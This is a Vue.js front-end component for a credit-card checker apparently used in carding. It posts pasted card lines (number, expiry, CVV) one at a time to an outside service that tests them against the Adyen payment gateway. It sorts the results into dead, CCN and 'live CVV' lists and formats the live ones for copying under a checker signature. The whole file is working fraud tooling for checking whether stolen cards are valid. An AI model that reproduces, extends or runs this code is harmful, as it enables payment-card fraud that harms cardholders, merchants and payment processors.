<template>
  <div>
    <v-tabs v-model="tab" centered>
      <v-tab>Generate</v-tab>
      <v-tab>Checker</v-tab>
      <v-tab>Results</v-tab>
    </v-tabs>
    <v-tabs-items v-model="tab">
      <v-tab-item>
        <div class="d-flex justify-center align-center" style="height:85vh">
          Coming Soon
        </div>
      </v-tab-item>
      <v-tab-item>
        <div class="px-5 pt-2 " style="height:85vh">
          <div class="pb-5">
            <p class="red--text">
              You can check 50 cards per check in this gate with rate 2 seconds!
            </p>
          </div>
          <div class="pb-5">
            <v-textarea
              solo
              :placeholder="cc"
              :cols="35"
              :rows="10"
              v-model="ccs"
            ></v-textarea>
          </div>
          <div class="pb-5">
            <v-btn
              class="mr-5 mb-5"
              v-if="!loading2"
              color="success"
              @click="checkCC"
              style="width:150px"
            >
              Check
            </v-btn>
            <v-btn
              class="mr-5 mb-5"
              color="error"
              v-if="loading2"
              @click="stopChecking"
            >
              Stop Checking
            </v-btn>
          </div>
        </div>
      </v-tab-item>
      <v-tab-item>
        <div class="pt-5">
          <div class="d-flex justify-space-around mb-4">
            <v-badge
              :content="dead.length"
              :value="dead.length"
              overlap
              color="grey"
            >
              <v-btn
                elevation="2"
                color="error"
                @click="changeTable(1)"
                style="width:50px"
                >Dead</v-btn
              >
            </v-badge>
            <v-badge
              :content="ccn.length"
              :value="ccn.length"
              overlap
              color="grey"
            >
              <v-btn
                elevation="2"
                color="primary"
                @click="changeTable(2)"
                style="width:50px"
                >CCN</v-btn
              >
            </v-badge>
            <v-badge
              :content="livecvv.length"
              :value="livecvv.length"
              overlap
              color="grey"
            >
              <v-btn
                elevation="2"
                color="success"
                @click="changeTable(3)"
                style="width:50px"
                >CVV</v-btn
              >
            </v-badge>
          </div>
          <div>
            <v-simple-table
              :class="{ 'd-none': current_table == 1 ? false : true }"
            >
              <thead>
                <tr>
                  <th class="text-center">
                    Number
                  </th>
                  <th class="text-center">
                    Result
                  </th>
                </tr>
              </thead>
              <tbody>
                <tr v-for="(dead1, index) in dead" :key="index">
                  <td class="text-center">{{ dead1.number }}</td>
                  <td class="text-center">{{ dead1.result }}</td>
                </tr>
              </tbody>
            </v-simple-table>
            <v-simple-table
              :class="{ 'd-none': current_table == 2 ? false : true }"
            >
              <thead>
                <tr>
                  <th class="text-center">
                    Number
                  </th>
                  <th class="text-center">
                    Result
                  </th>
                </tr>
              </thead>
              <tbody>
                <tr v-for="(ccn1, index) in ccn" :key="index">
                  <td class="text-center">{{ ccn1.number }}</td>
                  <td class="text-center">{{ ccn1.result }}</td>
                </tr>
              </tbody>
            </v-simple-table>
            <v-simple-table
              :class="{ 'd-none': current_table == 3 ? false : true }"
            >
              <thead>
                <tr>
                  <th class="text-center">
                    Number
                  </th>
                  <th class="text-center">
                    Result
                  </th>
                </tr>
              </thead>
              <tbody>
                <tr v-for="(cvv1, index) in livecvv" :key="index">
                  <td class="text-center">{{ cvv1.number }}</td>
                  <td class="text-center" v-html="cvv1.result"></td>
                </tr>
              </tbody>
            </v-simple-table>
          </div>
        </div>
      </v-tab-item>
    </v-tabs-items>
    <v-fab-transition>
      <v-btn
        v-show="current_table == 1 && dead.length != 0 && tab == 2"
        fixed
        bottom
        right
        fab
        class="mr-7 mb-10"
        @click="clearDead"
      >
        <v-icon color="error">mdi-delete</v-icon>
      </v-btn>
    </v-fab-transition>
    <v-fab-transition>
      <v-btn
        v-show="current_table == 2 && ccn.length != 0 && tab == 2"
        fixed
        bottom
        right
        fab
        class="mr-7 mb-10"
        @click="copyCCN"
      >
        <v-icon color="primary">mdi-content-copy</v-icon>
      </v-btn>
    </v-fab-transition>
    <v-fab-transition>
      <v-btn
        v-show="current_table == 3 && livecvv.length != 0 && tab == 2"
        fixed
        bottom
        right
        fab
        class="mr-7 mb-10"
        @click="copyCVV"
      >
        <v-icon color="success">mdi-content-copy</v-icon>
      </v-btn>
    </v-fab-transition>
    <v-snackbar v-model="noti" :color="noticolor" :timeout="1500">
      {{ notitext }}

      <template v-slot:action="{ attrs }">
        <v-btn color="black" text v-bind="attrs" @click="noti = false">
          Close
        </v-btn>
      </template>
    </v-snackbar>
  </div>
</template>

<script>
const axios = require("axios");
export default {
  data() {
    return {
      cc:
        "Input Format\nxxxxxxxxxxxxxxxx|xx|xxxx|xxx\nxxxxxxxxxxxxxxxx|xx|xxxx|xxx\nxxxxxxxxxxxxxxxx|xx|xxxx|xxx\nxxxxxxxxxxxxxxxx|xx|xxxx|xxx\nxxxxxxxxxxxxxxxx|xx|xxxx|xxx\nxxxxxxxxxxxxxxxx|xx|xxxx|xxx\nxxxxxxxxxxxxxxxx|xx|xxxx|xxx\nxxxxxxxxxxxxxxxx|xx|xxxx|xxx",
      dead: [],
      ccn: [],
      livecvv: [],
      current_table: 0,
      tab: 1,
      loading2: false,
      skcheck: false,
      switch1: false,
      noti: false,
      notitext: "",
      noticolor: "success",
      ccs: "",
      sk: "",
      interuption: false,
      procout: false,
    };
  },
  methods: {
    copyCCN() {
      let tmptxt =
        "CCN Cards\n---------------\nGateway: Adyen\n\nChecker: 『ＧｕＣｌ』 Gu(古)\n";
      this.ccn.forEach((item) => {
        tmptxt += item.number + " >" + item.result + "\n";
      });
      this.copyCode(tmptxt);
    },
    copyCVV() {
      let tmptxt =
        "CVV Cards\n---------------\nGateway: Adyen\n\nChecker: 『ＧｕＣｌ』 Gu(古)\n";
      this.livecvv.forEach((item) => {
        tmptxt += item.number + " >" + item.result + "\n";
      });
      this.copyCode(tmptxt);
    },
    copyCode(txt) {
      try {
        navigator.clipboard.writeText(txt);
        this.notitext = "Copied to Clipboard";
        this.noticolor = "success";
        this.noti = true;
      } catch (e) {
        this.notitext = "Sorry! Cannot copy to clipboard.";
        this.noticolor = "error";
        this.noti = true;
      }
    },
    stopChecking() {
      this.interuption = true;
    },
    clearDead() {
      this.dead = [];
    },
    changeTable(table) {
      this.current_table = this.current_table == table ? 0 : table;
    },
    deleteline() {
      let ccs = this.ccs.split("\n");
      ccs.splice(0, 1);
      this.ccs = ccs.join("\n");
    },
    checkCC() {
      if (this.ccs == null || this.ccs == "") {
        this.notitext = "No CC input!";
        this.noticolor = "error";
        this.noti = true;
        return null;
      }
      if (this.ccs.split("\n").length > 50) {
        this.notitext = "Only 50 cards per check!";
        this.noticolor = "error";
        this.noti = true;
        return null;
      }

      this.loading2 = true;
      let tmpdelay = 2000;
      let checkInterval = setInterval(() => {
        if (this.ccs == "" || this.interuption) {
          this.loading2 = false;
          clearInterval(checkInterval);
          this.interuption = false;
        } else {
          let tmpcc = this.ccs.split("\n")[0];
          this.adyen(tmpcc);
          this.deleteline();
        }
      }, tmpdelay);
    },
    adyen(cc) {
      var data = JSON.stringify({
        cc: cc,
      });

      var config = {
        method: "post",
        url: "https://adyen.hostman.site/cc",
        headers: {
          "Content-Type": "application/json",
        },
        data: data,
      };

      axios(config)
        .then((res) => {
          if (res.data.Status == "Refused") {
            this.dead.push({
              number: cc,
              result: "Declined > " + res.data.Reason,
            });
          } else {
            this.dead.push({ number: cc, result: res.data });
          }
        })
        .catch((error) => {
          console.log(error);
        });
    },
  },
};
</script>

<style></style>
